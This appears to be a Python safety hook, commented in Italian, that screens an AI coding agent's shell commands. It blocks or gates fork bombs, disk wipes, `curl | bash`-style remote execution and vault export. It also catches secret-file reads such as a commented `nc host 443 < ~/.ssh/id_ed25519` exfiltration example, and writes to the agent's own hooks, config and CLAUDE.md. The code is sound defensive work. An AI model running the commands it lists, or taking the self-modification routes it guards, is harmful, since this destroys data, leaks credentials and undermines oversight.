#!/usr/bin/env python3
"""PreToolUse(Bash, Monitor, Read, Grep) hook: blocca o gate shell command pericolosi.

I deny in settings.json coprono i casi a stringa esatta (`rm -rf /`, force-push col flag subito
dopo push). Questo hook copre cio' che il match di stringa non gestisce, compreso il push forzato
in ogni posizione del flag (7/11/2026). Gira su Bash e Monitor; su Read e Grep guarda solo le
chiavi private in ~/.ssh (sotto).

BLOCCO DURO (exit 2, stderr -> modello):
- fork bomb, raw write su disco (`> /dev/...`, `dd of=/dev/...`, `mkfs.*`)
- cancellazione della radice, della home o di un disco intero, giudicata sui programmi
  e non sul testo (1/11/2026): `rm -r /`, `rm -rf ~`, `del /s C:\\`, `rd /s C:`, `format C:`,
  anche dentro `cmd /c`. `grep "rm -rf /" f` tace
- chmod/chown ricorsivo su root
- esecuzione di script remoto scaricato al volo: `curl ... | bash`, ma anche
  `bash <(curl ...)`, `eval "$(curl ...)"`, `curl ... | python`. Dal 15/9/2026
  `curl ... | python3 -c "<codice>"` blocca solo se il codice inline esegue testo
  (exec, eval, subprocess, getattr, `$(`): altrimenti è parsing dello stdin
- `bw export` (dump dell'intera vault Bitwarden in chiaro)

CHIEDE CONFERMA (permissionDecision:"ask", exit 0):
- `rm -r`, `find -delete`, `shutil.rmtree` su una cartella che non si rigenera da
  sola e non è temporanea (~/.claude, memoria, progetti, cwd, cartelle di lavoro)
- `git clean -f` (i file non tracciati non stanno in nessun commit)
- scrittura shell su un percorso di PERCORSI_PROTETTI, la tabella che li elenca tutti: la config
  e le guardie (auto-modifica, codice non firmato installato da solo), i git hook e i servizi di
  avvio automatico, i CLAUDE.md, incluso il caso `cd ~/.claude/hooks && > file` (target relativo
  dopo un cd) e il codice passato a cmd e powershell
- creazione di un file di unlock (*-unlock-*) che sbloccherebbe l'auto-modifica
- lettura di file segreti via shell (cat/head/xxd/base64/perl/ruby/nc/redirezione
  `< file`... su chiavi private, ~/.ssh, ~/.aws/credentials, .gnupg, *.pem, .env...),
  anche indiretta: `find <segreto> | xargs cat`, `find -exec cat`, `while read`
- Read di un file in ~/.ssh che non è config, known_hosts, authorized_keys o una chiave
  pubblica: una chiave privata con un nome libero sfugge ai deny (1/11/2026)
- sed che esegue in shell, col comando `e` o col flag `e` di s/// (regola sed-e, 1/11/2026)
- git push con la destinazione riscritta nello stesso comando: `-c remote.X.url=`, pushurl,
  insteadOf, `--config-env`, GIT_CONFIG_* (regola git-destinazione, 1/11/2026)
- git branch -D di un ramo con commit che non stanno altrove, git stash drop di uno stash che
  lo stesso comando non salva prima, git stash clear (regole git-ramo e git-stash)
- git worktree remove --force su un worktree con file modificati o nuovi (regola git-worktree,
  segnalazione n. 55, 4/11/2026)
- docker distruttivo su volumi (`docker volume rm`, `system prune --volumes`)

Fail-open su parsing (i casi catastrofici su path root restano nei deny).
"""
import json
import re
import sys
import os
import signal
import shlex
import subprocess
import importlib.util
import fnmatch


def _stdin_timeout(signum, frame):
    sys.exit(0)


if hasattr(signal, "SIGALRM"):
    signal.signal(signal.SIGALRM, _stdin_timeout)


# --- Blocco duro (exit 2) ---
# Il comando che scarica: curl e wget ovunque, fetch solo in testa a un segmento.
_DOWNLOAD = r"(\b(?:curl|wget)\b|(?:^|[;&|(`\n])\s*(?:sudo\s+)?fetch\b)"
# La pipe vera fra due stadi (`\|` di un pattern non lo è, `||` nemmeno), con gli stadi in mezzo
# (`curl x | tee f | bash`) e sudo con le sue opzioni (`sudo -E bash`): review del 7/11/2026, finding 1.
_PIPE = r"(?<!(?<!\\)\\)\|(?!\|)"
# Gli stadi in mezzo si leggono con le virgolette intere: `curl u | grep -E 'a|php'` non ha una terza pipe, e
# il blocco era falso. Il primo tratto resta `[^|]*`, così `echo "$(curl u)" | bash` blocca ancora. Dopo la
# pipe valgono anche `|&`, un gruppo che si apre (`| (bash)`) e sudo o doas con le opzioni che prendono un
# valore (`sudo -u root bash`): review del 9/11/2026, #5097. Solo gruppi non catturanti oltre a sudo: la
# regola python conta i gruppi per il \3.
_STADIO_VIRGOLETTE = r"(?:[^|'\"\\]|\\[\s\S]|'[^']*'|\"(?:\\[\s\S]|[^\"\\])*\")*"
# Nel gruppo dopo la pipe l'interprete può venire dopo altri comandi del gruppo, separati da `;`, `&`, `&&`,
# `||` o dall'a capo: lo stdin del gruppo arriva anche a lui. I comandi prima si leggono con le virgolette
# intere (#5122). Ogni testo ha un modo solo di dividersi: gli spazi stanno nel comando che segue, `&&` è un
# separatore solo e non due `&`. Con due letture possibili il ritorno all'indietro cresce esponenziale.
_COMANDO_GRUPPO = r"(?:[^|;&\n'\"\\]|\\[\s\S]|'[^']*'|\"(?:\\[\s\S]|[^\"\\])*\")*"
_GRUPPO_DOPO_PIPE = r"(?:[({](?:" + _COMANDO_GRUPPO + r"(?:;|&&|&(?!&)|\|\||\n))*\s*)?"
_FINO_ALLO_STADIO = (r"[^|]*(?:" + _PIPE + _STADIO_VIRGOLETTE + r")*?" + _PIPE + r"&?\s*" + _GRUPPO_DOPO_PIPE +
                     r"((?:sudo|doas)(?:\s+(?:-[ugChDprtTU]|--(?:user|group|host|prompt|role|type|chdir|"
                     r"other-user|close-from|command-timeout))(?:\s+|=)[^\s|;&]+|\s+-\S+)*\s+)?")
# curl|bash e le sue varianti che eseguono uno script remoto scaricato al volo. Si giudicano su ogni
# istruzione (forma_comando.istruzioni): `curl -o d.csv url; head d.csv | python3 conta.py` scarica in un'istruzione e
# legge un file locale nell'altra, e il blocco duro non lascia confermare (finding 10).
# `\|` non è una pipe: è l'alternativa di un pattern (`grep 'curl\|python'`, 21/10/2026).
# `fetch` conta solo come comando in testa a un segmento (il fetch di BSD): `git fetch && git show
# x:f.py | python3 -` legge un file del repo, e non scarica niente (2/11/2026, #4478). _DOWNLOAD
# resta un solo gruppo che cattura: la regola python sotto conta i gruppi per il \3.
DANGEROUS_ISTRUZIONE = [
    (_DOWNLOAD + _FINO_ALLO_STADIO + r"(bash|sh|zsh|fish|perl|ruby|node|php)\b",
     "pipe di script remoto in un interprete"),
    # 15/9/2026: `curl ... | python3 -c "import json..."` è parsing, non esecuzione
    # dello stdin (14 blocchi in una settimana). Passa solo il codice inline fra
    # virgolette senza command-substitution né primitive che eseguono testo. Le
    # coppie di escape (`\\n`, `\\"`) si consumano intere: la ricerca delle parole
    # vietate continua fino alla virgoletta che chiude davvero.
    # 15/10/2026: anche con i flag dell'interprete prima di -c (`python3 -I -c`, la
    # forma isolata) e con la versione (`python3.13`).
    # 30/10/2026 (#4109): passa anche `| python3 -m json.tool` con le sue opzioni a fine segmento:
    # formatta il JSON e non esegue niente.
    (_DOWNLOAD + _FINO_ALLO_STADIO + r"python3?(?:\.\d+)?(?![\w.])"
     r"(?!(?:\s+-[IEsSBuOqP]+)*\s+-m\s+json\.tool(?:\s+--[a-z-]+(?:[=\s]\d+)?)*(?=\s*(?:$|[;&|)>\n\"']|2>)))"
     r"(?!(?:\s+-[IEsSBuOqP]+)*\s+-c\s+([\"'])(?:\\[\s\S]|(?!\3|\\|\$\(|`|\b(?:exec|eval|compile|__import__|__builtins__|builtins|"
     r"getattr|globals|importlib|system|popen|subprocess|runpy|pickle|marshal|spawn)\b)[\s\S])*\3)",
     "pipe di script remoto in un interprete"),
]
DANGEROUS = [
    (r":\(\)\s*\{[^}]*\}\s*;\s*:", "fork bomb"),
    (r"\bdd\s+[^|]*\bof=/dev/(sd[a-z]|nvme|disk)", "scrittura raw su block device"),
    (r">\s*/dev/(sd[a-z]|nvme|disk|hd[a-z])", "redirezione raw su disco"),
    (r"\bchmod\s+-R\s+0*777\s+/(\s|$)", "permessi world-writable su root"),
    (r"\bchown\s+-R\s+\S+\s+/(\s|$)", "cambio ownership ricorsivo su root"),
    (r"\b(bash|sh|zsh|fish|python3?|perl|ruby|node|php)\b\s+<\(\s*(curl|wget|fetch)\b",
     "esecuzione via process-substitution di script remoto"),
    (r"\beval\b[^\n]*\$\(\s*(curl|wget|fetch)\b",
     "eval di output di download remoto"),
    (r"\b(bash|sh|zsh|fish|python3?|perl|ruby|node)\b\s+-c\s+[\"']?\$\(\s*(curl|wget|fetch)\b",
     "interprete -c su output di download remoto"),
    (r"\bsudo\s+rm\s+-rf?\s+(/|~|\$HOME|\*)", "rm ricorsivo con sudo su root/home/wildcard"),
]
# mkfs e `bw export` si giudicano sui programmi del comando (_programma_pericoloso): nel testo
# `grep -n 'bw export' README.md` sembrava un export (finding 10).
# `bw export` anche con opzioni e valori davanti (`bw --session X export`): il deny di settings.json
# copre solo la forma letterale. `--help` non esporta niente: resta libero (12/9/2026).
_BW_EXPORT = re.compile(r"^(?:-[-\w]+(?:\s+[^\s-]\S*)?\s+)*export(?:\s|$)(?!\s*(?:--help|-h)\b)")

# --- Percorsi protetti: una tabella sola (#5122, passo 5) ---
# Da qui escono i predicati sul percorso risolto (_under_claude_config, _is_persistenza, _is_unlock,
# _is_claude_md), i frammenti delle regex di riserva sul testo bash e le regex del codice di cmd e
# powershell (_WIN_PROTETTI). Un percorso nuovo si aggiunge qui, e vale in tutte e tre.
# Ogni voce: (regola, forma, percorso, esempio, riserva). Le forme:
#   albero-claude  la cartella sotto ~/.claude e tutto quello che contiene;
#   file-claude    un file sotto ~/.claude;
#   nome-radice    un nome, anche con *, direttamente in ~/.claude;
#   nome-cartella  "cartella/nome": un nome, anche con *, in una cartella di ~/.claude;
#   albero-home    la cartella sotto la home e tutto quello che contiene;
#   pezzo          un pezzo di percorso in qualunque punto, e quello che sta sotto;
#   nome-ovunque   il nome del file, in qualunque cartella.
# `riserva` dice se la voce entra nelle regex sul testo dei comandi bash. plugins/cache, plugins/marketplaces,
# firme, bin e arturo ne stanno fuori di proposito: nel testo sembrerebbero scritture anche come sorgente di
# un cp (/inizio, /aggiorna).
# Lì conta solo il percorso risolto. Il codice di cmd e powershell le legge tutte.
PERCORSI_PROTETTI = (
    # La config di Claude Code e le guardie stesse.
    ("config", "nome-radice", "settings*.json", "~/.claude/settings.json", True),
    ("config", "nome-radice", ".claude.json", "~/.claude/.claude.json", True),
    ("config", "albero-claude", "hooks", "~/.claude/hooks/block-dangerous.py", True),
    # Col plugin di Arturo il codice delle guardie sta nella cache e nei marketplace dei plugin
    # (docs/strati.md, 3/11/2026).
    ("config", "albero-claude", "plugins/cache", "~/.claude/plugins/cache/arturo/hooks/x.py", False),
    ("config", "albero-claude", "plugins/marketplaces", "~/.claude/plugins/marketplaces/arturo/x", False),
    # L'aggiornamento automatico: la chiave dei rilasci e i due script che la verificano e installano.
    # Chi li cambia fa installare da solo codice non firmato (16/10/2026, #3482).
    ("config", "albero-claude", "firme", "~/.claude/firme/rilasci.pub", False),
    ("config", "file-claude", "bin/aggiornamenti.py", "~/.claude/bin/aggiornamenti.py", False),
    ("config", "file-claude", "bin/aggiorna-applica.sh", "~/.claude/bin/aggiorna-applica.sh", False),
    # Il puntatore della barra (4/11/2026, #4567): col plugin la barra esegue
    # "$(cat ~/.claude/arturo/radice)/hooks/statusline.js". Lo scrive solo l'avvio.
    ("config", "file-claude", "arturo/radice", "~/.claude/arturo/radice", False),
    # L'ancora dei rilasci: fiducia.py verifica ogni aggiornamento con questa chiave.
    ("config", "file-claude", "arturo/rilasci.allowed_signers", "~/.claude/arturo/rilasci.allowed_signers", False),
    # Le preferenze della persona, comprese quelle delle guardie (strati F1, #4531): un .local può
    # allentare una guardia.
    ("config", "nome-cartella", "arturo/*.local", "~/.claude/arturo/block-dangerous.local", False),
    # I file di unlock, direttamente in ~/.claude dove protect_claude_md.py li cerca.
    ("sblocco", "nome-radice", "*unlock*", "~/.claude/config-unlock", True),
    # Le istruzioni di ogni sessione futura, in qualunque cartella.
    ("claude-md", "nome-ovunque", "CLAUDE.md", "progetto/CLAUDE.md", True),
    ("claude-md", "nome-ovunque", "CLAUDE.local.md", "progetto/CLAUDE.local.md", True),
    # Il codice che parte da solo a ogni commit o a ogni accesso.
    ("avvio-automatico", "pezzo", ".git/hooks", "progetto/.git/hooks/pre-commit", True),
    ("avvio-automatico", "albero-home", "Library/LaunchAgents", "~/Library/LaunchAgents/x.plist", True),
    ("avvio-automatico", "albero-home", ".config/systemd/user", "~/.config/systemd/user/x.service", True),
    ("avvio-automatico", "albero-home", ".config/autostart", "~/.config/autostart/x.desktop", True),
)
# Come ogni regola tratta le maiuscole, uguale a prima della tabella. Nel predicato "piega" confronta con
# _piega (macOS e Windows ignorano le maiuscole, finding 11), "nome" mette in minuscolo solo il nome del
# file, "esatte" non piega. Nella riserva True vuol dire re.IGNORECASE. cmd e powershell piegano sempre.
# Il flag per le regex che cercano il nome di un programma nel testo del comando: su macOS e Windows il
# disco ignora le maiuscole, e `SED`, `FIND` e `PYTHON3` fanno partire sed, find e python3 (revisione del
# 10/11/2026, HK-1b). Stessa regola di forma_comando.RE_NOMI, che qui non è ancora caricato.
_RE_NOMI = re.IGNORECASE if sys.platform in ("darwin", "win32") else 0
_SED = r"(?i:\bsed\b)" if _RE_NOMI else r"\bsed\b"
_MAIUSCOLE = {"config": ("piega", True), "sblocco": ("nome", True), "claude-md": ("esatte", False),
              "avvio-automatico": ("piega", False)}
# Un pezzo di nome nelle regex, al posto di *.
_DENTRO_NOME = r"[^/\s'\";|&]*"


def _frammento(forma, percorso, modo="bash"):
    """La regex di una voce della tabella, per il testo bash, per il codice di cmd e powershell ("win") o
    per il primo argomento di open() ("open").

    Un albero vuole la barra dopo il nome nel testo bash (un file dentro), e in cmd e powershell anche la
    cartella sola (Remove-Item -Recurse). Un nome vale come prefisso, col solo limite di una lettera dopo:
    `settings.json$x` scrive settings.json se $x è vuota, e il percorso risolto non lo vede. Un nome che
    finisce con * arriva alla fine del percorso, così una cartella con "unlock" nel nome non è un unlock.
    In open() il nome si ferma al primo pezzo scritto: `open('~/.claude/settings' + '.json', 'w')`."""
    pezzi = percorso.split("/")
    if modo == "open" and forma not in ("albero-claude", "albero-home", "pezzo"):
        parti = pezzi[-1].split("*")
        primo = next(i for i, x in enumerate(parti) if x)
        pezzi[-1] = "*".join(parti[:primo + 1])
    testo = "/".join(_DENTRO_NOME.join(re.escape(x) for x in pezzo.split("*")) for pezzo in pezzi)
    if forma in ("albero-claude", "file-claude", "nome-radice", "nome-cartella"):
        testo = r"\.claude/" + testo
    if forma in ("albero-claude", "albero-home", "pezzo"):
        return testo + (r"(?![\w.-])" if modo == "win" else "/")
    if modo == "open":
        return testo
    return testo + (r"(?=[\s'\";|&)]|$)" if percorso.endswith("*") else r"(?!\w)")


def _frammenti(regola, modo="bash"):
    """L'alternativa delle voci di una regola: tutte per cmd e powershell, le sole `riserva` per bash e open()."""
    return "(?:" + "|".join(_frammento(f, p, modo) for r, f, p, _es, ris in PERCORSI_PROTETTI
                            if r == regola and (modo == "win" or ris)) + ")"


def _riserva(regola, scritture="", open_modi="", coda_open=r"[^'\"]*"):
    """La regex di riserva sul testo di una regola: gli operatori di `scritture` seguiti da un percorso della
    tabella, oppure open() di python con un modo fra `open_modi`. Senza `scritture` o senza `open_modi` quella
    parte manca. `coda_open` è quello che può seguire il nome dentro le virgolette di open(). Le maiuscole
    seguono _MAIUSCOLE."""
    parti = []
    if scritture:
        parti.append(scritture.format(p=r"[^\s;|&]*?" + _frammenti(regola)))
    if open_modi:
        parti.append(r"open\(\s*['\"][^'\"]*" + _frammenti(regola, "open") + coda_open +
                     r"['\"]\s*,\s*['\"][" + open_modi + "]")
    return re.compile("(?:" + "|".join(parti) + ")", re.IGNORECASE if _MAIUSCOLE[regola][1] else 0)


# --- Scrittura su config/hook di Claude Code -> ask ---
# Il match testuale del path assoluto è il caso base; _writes_config() copre anche il target
# RELATIVO dopo un `cd ~/.claude/...`.
# cp, mv, install, rsync e ln non stanno qui: li giudica _writes_config, che sa quale
# argomento è la destinazione. Nel testo `cp ~/.claude/settings.json /tmp/x` sembrava una
# scrittura, e copiare la config altrove è una lettura (9/9/2026, nella config dell'autore).
# dd scrive solo su `of=`.
CONFIG_WRITE_RE = _riserva(
    "config",
    r">>?\s*{p}|\b(?:tee|truncate|touch|chmod|chown)\b[^|;&]*{p}|\bdd\b[^|;&]*\bof={p}|\bsed\b[^|;&]*-i[^|;&]*{p}",
    "wa")
# CLAUDE.md, in qualunque cartella: via Edit/Write protect_claude_md.py chiede una volta per modifica
# (l'unlock della sessione le fa passare tutte), qui si copre il vettore shell, che altrimenti lo riscrive
# senza prompt. Nel testo bastano redirezione e sed -i: cp, tee e gli altri binari li giudica _writes_config.
CLAUDE_MD_WRITE_RE = _riserva("claude-md", r">>?\s*{p}|" + _SED + r"[^|;&]*-i[^|;&]*{p}")
# open() di python in scrittura su un CLAUDE.md: chiede sempre, prima di CLAUDE_MD_WRITE_RE (1/11/2026).
# Il nome chiude le virgolette: `CLAUDE.md.bak` non è un CLAUDE.md.
CLAUDE_MD_OPEN_RE = _riserva("claude-md", open_modi="wax+", coda_open="")
# Percorsi di avvio automatico (git hook, LaunchAgents, systemd utente, autostart):
# via Edit/Write li protegge protect_claude_md.py con un unlock, qui il vettore shell.
# Qui solo redirezione e open(): cp, tee, sed -i e gli altri binari li giudica
# _writes_config, che sa quale argomento è la destinazione (copiare un hook
# altrove è una lettura).
PERSIST_WRITE_RE = _riserva("avvio-automatico", r">>?\s*{p}", "wa")
# Binari che scrivono un file passato come argomento.
_WRITE_BINS = frozenset("tee cp mv install rsync ln dd truncate touch".split())

# --- File di unlock che sbloccherebbero l'auto-modifica di config/hook -> ask ---
# Solo la CREAZIONE del file (redirezione, touch, tee, open in scrittura) e solo direttamente
# in ~/.claude, dove protect_claude_md.py lo cerca. Leggere una nota che ha "unlock" nel nome
# non sblocca niente (8/9/2026, nella config dell'autore). cp, mv e ln, anche verso la cartella, e mkdir:
# _writes_config(_is_unlock, crea=True) (#5261).
UNLOCK_RE = _riserva("sblocco", r"(?:>>?\s*|\b(?:touch|tee|mkdir)\b[^|;&]*){p}", "wax")

# --- Lettura di file segreti via shell -> ask (vedi _reads_secret sotto) ---
# In ~/.ssh/ chiedono le chiavi private e i file sconosciuti. config, known_hosts,
# authorized_keys e le chiavi pubbliche (.pub) non sono segreti: si leggono liberi
# (8/9/2026, la config dell'autore chiedeva a ogni `grep Host ~/.ssh/config`).
_SSH_SEGRETO = (r"\.ssh/(?!(?:config|known_hosts(?:\.old)?|authorized_keys)(?![\w.-])|[^\s'\"/]*\.pub(?![\w.-]))"
                r"|(?:^|/)id_(?:rsa|ed25519|ecdsa|dsa)\b(?!\.pub\b)")
_SSH_LETTURA = re.compile(r"(?:^|/)\.ssh/(?!config\.d/)(?:[^/]+/)*"
                          r"(?!(?:config|known_hosts(?:\.old)?|authorized_keys)$|[^/]*\.pub$)[^/]+$", re.IGNORECASE)
SECRET_PATH_RE = re.compile(
    # In ~/.aws tutto tranne config (regione e profili): `cat ~/.aws/*` legge anche le credenziali (finding 4).
    r"(" + _SSH_SEGRETO + r"|\.aws/(?!config(?![\w.-]))|\.gnupg/|"
    # I file col solo nome (token_cache.json...) contano come argomento o in un path, non
    # citati dopo uno spazio: `python3 -c "...write('serve rm token_cache.json')"` scrive una
    # nota, non legge il token (8/9/2026, nella config dell'autore).
    r"\.git-credentials|\.pem\b|"
    r"(?<!\s)(?:service-account[^\s'\"]*\.json|credentials\.json|client_secret[^\s'\"]*\.json|token_cache\.json)|"
    r"\.pypirc|secrets\.env|\.secrets/|"
    r"\.config/gh/hosts\.yml|\.npmrc|\.claude/data/credentials/|"
    r"\.docker/config\.json|\.kube/config|"
    # ~/.claude.json tiene le env dei server MCP, chiavi API comprese. Solo in forma di
    # PATH (`/` o `~` davanti): il nome citato in una frase non è una lettura.
    r"[/~][^\s'\"]*/\.claude\.json)",
    re.IGNORECASE,
)
# Un file .env (anche .env.local, config/.env.production): le chiavi dei servizi di un progetto
# (17/10/2026, #3506). Non .env.example e simili, non process.env. Come destinazione di una copia
# (`cp .env.example .env`) si scrive, non si legge: vedi _reads_secret_flat.
ENV_RE = re.compile(r"(?<![\w.])\.env\b(?!\.(?:example|sample|template|dist)\b)", re.IGNORECASE)

# Check segreti PER-SEGMENTO. Chiede se un path segreto compare come ARGOMENTO
# (non come identità ssh) in un segmento il cui comando è un binario di lettura
# o di trasporto, oppure se il segmento reindirizza un segreto in ingresso
# (`< chiave`, `$(< chiave)`). Ampliato per coprire perl/ruby/nc/socat/tac/rev/
# mapfile e la redirezione, che prima sfuggivano (chiave privata leggibile/inviata
# senza ask). Lo scarto di `-i <key>` / `IdentityFile=` evita i falsi positivi su
# ssh/scp -i <chiave> (identità, non lettura).
# Dal 7/11/2026 (finding 4) anche i lettori in permissions.allow, che il classificatore non giudica:
# sort, uniq, jq, diff e gli altri che stampano il contenuto di un file.
_READ_BINS = frozenset(
    "cat head tail less more bat xxd od strings base64 nl cut awk sed "
    "cp scp rsync dd open grep perl ruby python python3 tac rev mapfile "
    "nc ncat socat gpg tar zip curl wget "
    "sort uniq jq yq diff cmp hexdump hd iconv fold fmt pr expand column paste join comm rg egrep fgrep "
    "zcat look 7z".split()
)
# Programmi che leggono una cartella intera: la cartella dei segreti nominata senza un file dentro
# (`grep -r . ~/.ssh`, `cp -R ~/.ssh x`, `tar czf a.tgz ~/.ssh`) porta fuori tutte le chiavi.
_LEGGONO_CARTELLE = frozenset("cp scp rsync tar zip 7z rg".split())
_CARTELLA_SEGRETA = re.compile(r"(?:^|/)(?:\.ssh|\.gnupg|\.secrets|\.aws|\.claude/data/credentials)/?(?:\*|\.)?$")
_ENV_ASSIGN_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")
_SKIP_WRAPPERS = frozenset(("sudo", "command", "nohup", "caffeinate", "timeout", "env"))
# `< file` o `$(< file)` con file segreto: esfiltrazione via redirezione (es.
# `nc host 443 < ~/.ssh/id_ed25519`, `echo "$(<~/.ssh/id_ed25519)"`).
_SECRET_REDIR_RE = re.compile(
    r"(?:<\s*|\$\(\s*<\s*)[^\s;|&)]*?"
    r"(\.ssh/(?!(?:config|known_hosts(?:\.old)?|authorized_keys)(?![\w.-])|[^\s'\"/]*\.pub(?![\w.-]))|"
    r"id_(rsa|ed25519|ecdsa|dsa)\b(?!\.pub\b)|\.aws/(?!config(?![\w.-]))|\.gnupg/|"
    r"\.git-credentials|\.pem|credentials\.json|\.pypirc|secrets\.env|\.secrets/|"
    r"token_cache\.json|client_secret|\.claude/data/credentials/|"
    r"(?<![\w.])\.env\b(?!\.(?:example|sample|template|dist)\b))",
    re.IGNORECASE,
)


def _programma_pericoloso(testo: str):
    """mkfs e `bw export` come programmi del comando, anche dentro sh -c ed eval (finding 10) e dentro una
    command-substitution, che bash esegue anche fra virgolette doppie: `git commit -m "$(bw export)"` esporta
    davvero (banco della config, 9/11/2026: il lotto L2 l'aveva lasciato passare)."""
    for sorgente in [testo] + _cmd_subst_bodies(testo):
        for nome, args in _fc.programmi(sorgente):
            if nome.startswith("mkfs.") or nome == "mkfs":
                return "format filesystem"
            if nome == "bw" and _BW_EXPORT.match(" ".join(args)):
                return "export dell'intera vault Bitwarden in chiaro"
    return None


def _cmd_subst_bodies(command: str):
    """Corpi delle command-substitution `$(...)` e backtick: bash li ESEGUE anche
    dentro le doppie virgolette, quindi `git commit -m "$(cat chiave)"` legge davvero
    la chiave. Vanno analizzati come comandi a se'."""
    bodies = re.findall(r"\$\(([^()]*)\)", command)
    bodies += re.findall(r"`([^`]*)`", command)
    return bodies


def _reads_secret(command: str) -> bool:
    cmd = _testo_shell(command).replace("\\\n", " ")  # prima gli heredoc: una \ nel corpo è testo
    cmd = _barre(cmd)  # su Windows `C:\Users\x\.ssh\id_ed25519` (#5096)
    for src in [cmd] + _cmd_subst_bodies(cmd):
        if _reads_secret_flat(src):
            return True
    return False


# Il tokenizer (heredoc, messaggi di commit, segmenti) sta in forma_comando.py dal 15/10/2026:
# prima forma_comando caricava questo file e questo file caricava forma_comando.
_spec_fc = importlib.util.spec_from_file_location(
    "forma_comando", os.path.join(os.path.dirname(os.path.abspath(__file__)), "forma_comando.py"))
_fc = importlib.util.module_from_spec(_spec_fc)
_spec_fc.loader.exec_module(_fc)
_testo_shell = _fc.testo_shell
_segmenti_parole = _fc.segmenti_parole
_hd = _fc._hd


# grep che stampa solo conteggi o nomi di file: nessun contenuto esce.
_GREP_SOLO_METADATI = re.compile(r"^-[A-Za-z]*[clLq][A-Za-z]*$|^--(count|files-with(out)?-matches?|quiet|silent)$")
_GREP_OPT_CON_ARG = frozenset(("-A", "-B", "-C", "-m", "-d", "-D", "--context", "--max-count"))


def _senza_pattern(binario: str, args: list) -> list:
    """Toglie il pattern di grep o lo script di sed: è testo, non un file letto.

    `grep -e P` e `sed -e S` hanno il pattern esplicito, e allora nessun
    argomento posizionale è pattern. `grep -f F` e `sed -f F` LEGGONO F: resta.
    """
    if binario not in ("grep", "egrep", "fgrep", "rg", "sed"):
        return args
    esplicito = ("-e", "--regexp", "--expression")
    fuori, i, tolto = [], 0, False
    if any(a in esplicito or a in ("-f", "--file") or a.startswith(("--regexp=", "--expression=", "--file=")) for a in args):
        tolto = True
    while i < len(args):
        a = args[i]
        if a in esplicito:
            i += 2
            continue
        if binario == "sed" and a == "-i" and i + 1 < len(args) and (args[i + 1] == "" or args[i + 1].startswith(".")):
            fuori.extend(args[i:i + 2])
            i += 2
            continue
        if a in ("-f", "--file") or (a in _GREP_OPT_CON_ARG and binario != "sed"):
            fuori.extend(args[i:i + 2])
            i += 2
            continue
        if not tolto and not a.startswith("-"):
            tolto = True
            i += 1
            continue
        fuori.append(a)
        i += 1
    return fuori


_SHELLS = _fc.SHELL
# La cartella nominata senza slash finale (`find ~/.aws | xargs cat`): SECRET_PATH_RE
# vuole lo slash, perché per un cat diretto il nome della cartella non è una lettura.
# Per xargs e -exec invece la cartella è la sorgente dei file letti.
_SECRET_DIR_RE = re.compile(r"(\.ssh|\.gnupg|\.secrets|\.aws|\.claude/data/credentials)(?=[\s'\"/*]|$)")


def _lettura_indiretta(cmd):
    """Il path segreto e il lettore stanno in comandi diversi, e il controllo per
    segmento non li vede insieme: `find <segreto> | xargs cat`,
    `echo <segreto> | while read f; do cat "$f"`, `find <segreto> -exec cat {} \\;`.
    `ls <segreto> | xargs basename` resta muto."""
    def segreto(s):
        return SECRET_PATH_RE.search(s) or _SECRET_DIR_RE.search(s)

    # Istruzioni e stadi dal lettore unico, che non spezza dentro le virgolette né dentro `2>&1` (#5122).
    for stmt in _fc.istruzioni(cmd):
        stadi = _fc.comandi_semplici(stmt)
        for k, stadio in enumerate(stadi):
            if not segreto(stadio):
                continue
            for dopo in stadi[k + 1:]:
                # `>&2 xargs cat`: la redirezione in testa non è il programma.
                toks = [_fc._nome(t) for t in re.sub(r"\d*>&\d+|&>", " ", dopo).split()]
                if not toks:
                    continue
                if toks[0] in ("xargs", "parallel") and any(t in _READ_BINS or t in _SHELLS for t in toks[1:]):
                    return True
                if toks[0] == "while" and "read" in toks[1:3]:
                    return True
        m = re.search(r"\bfind\b(.*?)\s-(?:exec|execdir|ok|okdir)\s+(\S+)", stmt, _RE_NOMI)
        if m and segreto(m.group(1)) and _fc._nome(m.group(2)) in (_READ_BINS | _SHELLS):
            return True
    return False


_INTERPRETI = frozenset(("python", "python3", "perl", "ruby"))
# Prosa: contiene spazi e non comincia come un path (/, ~, ., $).
_PROSA_RE = re.compile(r"^(?![/~.$])(?=[^\n]*\s)", re.DOTALL)


def _reads_secret_flat(cmd: str) -> bool:
    if _SECRET_REDIR_RE.search(cmd):
        return True
    if _lettura_indiretta(cmd):
        return True
    for toks in _segmenti_parole(cmd):
        # Wrapper con le loro opzioni e durate (`timeout 5 cat .env`, finding 2).
        toks = _dopo_involucri(toks)
        i = 0
        if not toks:
            continue
        binario = _fc._nome(toks[i])
        # `git diff --no-index A B` stampa due file qualunque (finding 4).
        if binario == "git" and "--no-index" in toks and "diff" in toks:
            toks = ["diff"] + [t for t in toks[toks.index("diff") + 1:] if t != "--no-index"]
            binario = "diff"
        if binario not in _READ_BINS:
            continue
        ricorsivo = binario in _LEGGONO_CARTELLE or (
            binario in ("grep", "egrep", "fgrep") and any(
                t in ("--recursive", "--dereference-recursive") or (t.startswith("-") and not t.startswith("--")
                                                                    and ("r" in t or "R" in t)) for t in toks[1:]))
        # grep -c, -l, -q: stampa conteggi o nomi di file, non il contenuto.
        if binario in ("grep", "egrep", "fgrep") and any(_GREP_SOLO_METADATI.match(t) for t in toks[i + 1:]):
            continue
        parole = _senza_pattern(binario, toks[i + 1:])
        grep = binario in ("grep", "egrep", "fgrep")
        args, j = [], 0
        while j < len(parole):
            t = parole[j]
            if t == "-i" and grep:
                j += 1  # per grep -i è "ignora maiuscole", senza argomento
                continue
            if t == "-i" and j + 1 < len(parole):
                j += 2  # identità ssh/scp/rsync (o suffix sed -i: mai un segreto)
                continue
            if t.startswith("-oIdentityFile=") or t.startswith("IdentityFile="):
                j += 1
                continue
            # rsync e tar: il valore di --exclude è un file che NON si legge (`--exclude .env` chiedeva
            # conferma, 20/10/2026, #3525).
            if t in ("--exclude", "--exclude-from", "--filter") and j + 1 < len(parole):
                j += 2
                continue
            if t.startswith(("--exclude=", "--exclude-from=", "--filter=")):
                j += 1
                continue
            args.append(t)
            j += 1
        # Interprete che esegue uno script: un argomento in prosa (con spazi, non un path) è testo
        # per lo script, non un file letto (`tasks.py comment ... "entra con ~/.ssh/id_ed25519"`
        # chiedeva conferma, 21/10/2026). Il codice di -c/-e resta controllato per intero.
        if binario in _INTERPRETI and args and not args[0].startswith("-"):
            args = [a for a in args if not _PROSA_RE.match(a)]
        if any(SECRET_PATH_RE.search(a) for a in args):
            return True
        letti = args[:-1] if binario in ("cp", "install", "rsync", "scp") and len(args) >= 2 else args
        if any(ENV_RE.search(a) for a in letti):
            return True
